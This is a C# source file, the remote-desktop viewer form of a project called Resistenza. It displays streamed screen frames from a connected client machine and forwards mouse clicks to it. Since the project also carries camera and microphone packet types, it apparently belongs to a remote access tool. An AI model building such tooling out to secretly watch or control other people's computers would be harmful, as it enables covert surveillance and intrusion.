using NAudio.Wave;
using OpenCvSharp.Extensions;
using Resistenza.Common.Networking;
using Resistenza.Common.Packets.Camera;
using Resistenza.Common.Packets.Logic;
using Resistenza.Common.Packets.Microphone;
using Resistenza.Common.Packets;
using Resistenza.Common.Packets.Remote_Desktop;
using Resistenza.Server.Networking;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.DirectoryServices.Protocols;
using System.Diagnostics;


using Timer = System.Timers.Timer;
using System.Runtime.InteropServices;
using OpenCvSharp;
using Point = System.Drawing.Point;
using System.IO.Compression;
using Org.BouncyCastle.Asn1.Cms;
using System.Drawing.Imaging;



namespace Resistenza.Server.Forms
{
    public partial class FrmRemoteDesktop : Form
    {

        private ConnectedClient _Client;
        private Dictionary<string, MonitorDeviceInfo> _DevicesAvailable;
        private int _Fps;
        private int _PreviousSecondFps;
        private readonly object _fpsCounterLock;
        private bool _IsFirstFrame;
        private Timer _FrameRateTimer;
        private bool _IsStreamingActive;
        private bool _IsStopRequested;
        private bool _IsInteractionActive;

        public FrmRemoteDesktop(ConnectedClient Client)
        {
            InitializeComponent();
            _Client = Client;
            _Client.IncomingPacket += _Client_IncomingPacket;

            string Loading = "Loading...";
            int In = DisplaysBox.Items.Add(Loading);
            DisplaysBox.Text = Loading;
            DisplaysBox.SelectedIndex = In;

            _IsFirstFrame = true;
            _IsStreamingActive = false;
            _IsStopRequested = false;
            _IsInteractionActive = false;
            _fpsCounterLock = new object();

            _MouseHook = IntPtr.Zero;
            _KeyboardHook = IntPtr.Zero;

            _MouseEventHandler = MouseEventCallback;

            //_DevicesAvailable = new Dictionary<string, MonitorDeviceInfo>();
        }
        private HookProc _MouseEventHandler;
        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookExA(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll")]
        private static extern uint GetCurrentThreadId();

        private static int WH_MOUSE = 7;

        private IntPtr _MouseHook;
        private IntPtr _KeyboardHook;

        private void _Client_IncomingPacket(object PacketReceived)
        {
            switch (PacketReceived)
            {
                case CancelRemoteOperationResponse:

                    if (((CancelRemoteOperationResponse)PacketReceived).TaskId == TasksIds.STREAM_DESKTOP_TASK_ID)
                    {
                        DesktopPictureBox.Image = null;
                        _IsStopRequested = false;
                    }
                    return;

                case DesktopListDisplaysResponse:
                    
                    DesktopListDisplaysResponse displayPacket = (DesktopListDisplaysResponse)PacketReceived;
                    _DevicesAvailable = new Dictionary<string, MonitorDeviceInfo>();

                    Invoke(() =>
                    {
                        int loadingIndex = DisplaysBox.Items.IndexOf("Loading...");
                        if (loadingIndex != -1)
                            DisplaysBox.Items.RemoveAt(loadingIndex);
                    });

                    if (displayPacket.Devices == null || displayPacket.Devices.Count == 0)
                    {
                        Invoke(() =>
                        {
                            string noDisplay = "No Display Available";
                            int idx = DisplaysBox.Items.Add(noDisplay);
                            DisplaysBox.Text = noDisplay;
                            DisplaysBox.SelectedIndex = idx;
                        });
                        return;
                    }

                    int deviceCounter = 0;
                    foreach (var device in displayPacket.Devices)
                    {
                        // Genera chiave unica per il dizionario
                        string key = $"{device.FriendlyName}_{deviceCounter++}";

                        if (!_DevicesAvailable.ContainsKey(key))
                            _DevicesAvailable.Add(key, device);

                        string identifier = $"{device.FriendlyName} ({device.ScreenWidth}x{device.ScreenHeight})" +
                                            (device.IsMainMonitor ? " (Main display)" : "");

                        // Aggiorna UI in modo sicuro
                        Invoke(() =>
                        {
                            int idx = DisplaysBox.Items.Add(identifier);
                            if (string.IsNullOrEmpty(DisplaysBox.Text))
                            {
                                DisplaysBox.Text = identifier;
                                DisplaysBox.SelectedIndex = idx;
                            }
                        });
                    }
                    return;

                case DesktopFrameResponse:

                    if (!_IsStopRequested)
                    {
                        if (_IsFirstFrame)
                        {
                            _IsFirstFrame = false;
                            _Fps = 0;

                            lock (_fpsCounterLock)
                            {
                                _FrameRateTimer = new Timer(1000); //un secondo
                                _FrameRateTimer.Elapsed += OnFrameRateTimerElasped;
                                _FrameRateTimer.Start();
                            }

                            FrameRateLabel.Visible = true;
                        }

                        DesktopFrameResponse FramePacket = (DesktopFrameResponse)PacketReceived;

                        using (var input = new MemoryStream(FramePacket.ScreenCapture))
                        using (var gzip = new GZipStream(input, CompressionMode.Decompress))
                        using (var output = new MemoryStream())
                        {
                            gzip.CopyTo(output);

                            Bitmap bitmapFrame = new Bitmap(FramePacket.Width, FramePacket.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                            var rect = new Rectangle(0,0,FramePacket.Width,FramePacket.Height);
                            BitmapData bmpData = bitmapFrame.LockBits(rect, ImageLockMode.WriteOnly, bitmapFrame.PixelFormat);

                            Marshal.Copy(output.ToArray(), 0, bmpData.Scan0, FramePacket.Height * FramePacket.Pitch);
                            bitmapFrame.UnlockBits(bmpData);

                            DesktopPictureBox.SizeMode = PictureBoxSizeMode.StretchImage;

                            DesktopPictureBox.Image = bitmapFrame;
                        }

                        
                        _Fps++;
                    }

                    return;              
            }

        }

        private void OnFrameRateTimerElasped(object? sender, System.Timers.ElapsedEventArgs e)
        {
            lock (_fpsCounterLock)
            {
                _FrameRateTimer.Stop();
                Invoke(() => FrameRateLabel.Text = $"FPS: {_PreviousSecondFps.ToString()}");
                _FrameRateTimer.Dispose();
                _FrameRateTimer = new Timer(1000);
                _FrameRateTimer.Elapsed += OnFrameRateTimerElasped;
                _FrameRateTimer.Start();
                _PreviousSecondFps = _Fps;
                _Fps = 0;
            }
        }

        private async void FrmRemoteDesktop_Load(object sender, EventArgs e)
        {
            DesktopStartRequest ListRequest = new DesktopStartRequest
            {
                ListDevices = true
            };

            await _Client.CustomStream.SendPacketAsync(ListRequest);


            //StartWatchingButton.Location = new Point((this.Size.Width - StartWatchingButton.Size.Width / 2), 700);
            //DesktopPictureBox.Location = new Point((this.Size.Width / 2) - (DesktopPictureBox.Size.Width / 2), DesktopPictureBox.Location.Y);
        }

        private async void StartWatchingButton_Click(object sender, EventArgs e)
        {

            if (!_IsStreamingActive)
            {
                if (!_IsStopRequested)
                {
                    StartWatchingButton.Text = "Stop watching";
                    StartWatchingButton.Location = new Point(150, StartWatchingButton.Location.Y);
                    InteractionModeBtn.Location = new Point(this.Size.Width - (150 + StartWatchingButton.Size.Width), StartWatchingButton.Location.Y);

                    DesktopStartRequest StartStreamingRequest = new DesktopStartRequest
                    {
                        StartTransmit = true,
                        NameTargetDisplay = DisplaysBox.SelectedText //to fix
                    };

                    await _Client.CustomStream.SendPacketAsync(StartStreamingRequest);

                    InteractionModeBtn.Visible = true;
                    _IsStreamingActive = true;
                }


            }
            else
            {
                var StopStreamingRequest = new CancelRemoteOperationRequest()
                {
                    TaskId = TasksIds.STREAM_DESKTOP_TASK_ID

                };
                await _Client.CustomStream.SendPacketAsync(StopStreamingRequest);

                _IsStopRequested = true;

                InteractionModeBtn.Visible = false;
                StartWatchingButton.Location = new Point((this.Size.Width / 2) - (StartWatchingButton.Size.Width / 2), StartWatchingButton.Location.Y);


                DesktopPictureBox.Image = null;
                StartWatchingButton.Text = "Start watching";
                FrameRateLabel.Visible = false;
                _IsStreamingActive = false;
                _IsFirstFrame = true;
            }
        }

        private MonitorDeviceInfo GetInfoOfSelectedMonitor()
        {
            string SelectedMonitorName = (DisplaysBox.SelectedItem as string).Substring(0, (DisplaysBox.SelectedItem as string).IndexOf("(") - 1); //hack, da fixare, crasha se friendly_name contiene una parentesi
            MonitorDeviceInfo AssociatedInfo;
            _DevicesAvailable.TryGetValue(SelectedMonitorName, out AssociatedInfo);
            return AssociatedInfo;

        }

        private IntPtr MouseEventCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (nCode != 0)//viene inviato dal processo corrente
            {
                MouseMessages Message = (MouseMessages)wParam;

                switch (Message)
                {
                    case MouseMessages.WM_RBUTTONDOWN:
                    case MouseMessages.WM_LBUTTONDOWN:

                        Point ScreenPos = Cursor.Position;
                        Point controlPos = DesktopPictureBox.PointToClient(ScreenPos);

                        MonitorDeviceInfo info = GetInfoOfSelectedMonitor();
                        int ClientScreenWidth = info.ScreenWidth;
                        int ClientScreenHeight = info.ScreenHeight;

                        int ClientX = (controlPos.X * ClientScreenWidth) / DesktopPictureBox.Width;
                        int ClientY = (controlPos.Y * ClientScreenHeight) / DesktopPictureBox.Height;

                        DesktopMouseActionRequest MouseEventRequest = new DesktopMouseActionRequest()
                        {
                            MousePosX = ClientX,
                            MousePosY = ClientY,
                            MouseMessage = Message,
                        };

                        Task sendT = _Client.CustomStream.SendPacketAsync(MouseEventRequest);
                        sendT.Wait();
                        break;

                }

            }

            return IntPtr.Zero;
        }

        private void EnableMouseHook()
        {

            _MouseHook = SetWindowsHookExA(WH_MOUSE, _MouseEventHandler, IntPtr.Zero, GetCurrentThreadId());


        }
        private void EnableKeyboardHook()
        {

        }
        private void InteractionModeBtn_Click(object sender, EventArgs e)
        {

            if (_IsInteractionActive)
            {
                InteractionModeBtn.Text = "Interaction Mode: Off";
                _IsInteractionActive = false;
            }
            else
            {
                InteractionModeBtn.Text = "Interaction Mode: On";
                _IsInteractionActive = true;
            }





        }

        private void DesktopPictureBox_MouseEnter(object sender, EventArgs e)
        {
            if (_IsInteractionActive)
            {
                EnableMouseHook();
                EnableKeyboardHook();
            }

        }

        private void DesktopPictureBox_MouseLeave(object sender, EventArgs e)
        {
            if (_IsInteractionActive)
            {
                UnhookWindowsHookEx(_MouseHook);
                UnhookWindowsHookEx(_KeyboardHook);
            }
        }

        private void DesktopPictureBox_LoadCompleted(object sender, AsyncCompletedEventArgs e)
        {
            DesktopPictureBox.Location = new Point((this.ClientSize.Width - DesktopPictureBox.Width) / 2, DesktopPictureBox.Location.Y);

        }

        private void DesktopPictureBox_Click(object sender, EventArgs e)
        {

        }
    }
}
